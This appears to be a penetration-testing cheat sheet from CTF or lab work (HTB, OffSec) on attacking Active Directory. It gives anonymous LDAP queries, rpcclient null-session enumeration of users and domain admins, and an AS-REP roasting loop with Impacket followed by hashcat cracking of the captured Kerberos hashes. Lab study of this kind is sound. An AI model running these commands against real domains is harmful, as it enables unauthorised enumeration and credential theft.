# Active Directory

## ldapsearch

It's worth checking if the LDAP service allows anonymous binds using the ldapsearch tool

If your server is accepting anonymous authentication, you will be able to perform a LDAP search query without binding to the admin account. (the domain in this case is htb.local

```
ldapsearch -x -h 192.168.65.122 -D '' -w '' -b "DC=hutch,DC=offsec"   
```

Note: This is the simplest form of output, so this will contain a whole to of information.

## RPC Enum

`rpcclient -U "" 10.10.10.161`

`enumdomusers` `enumdomgroups`

Query domain admins `querygroup 0x200` `querygroupmem 0x200`

Query admin `queryuser 0x1f4`

## AS-REP roasting

There is an option for an account to have the property Do not require Kerberos preauthentication or UF\_DONT\_REQUIRE\_PREAUTH set to true. AS-REP Roasting is an attack against Kerberos for these accounts. I have a list of accounts from my RPC enumeration above. Ill start without the SM _or HealthMailbox_ accounts

`for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done`

`hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt --force`
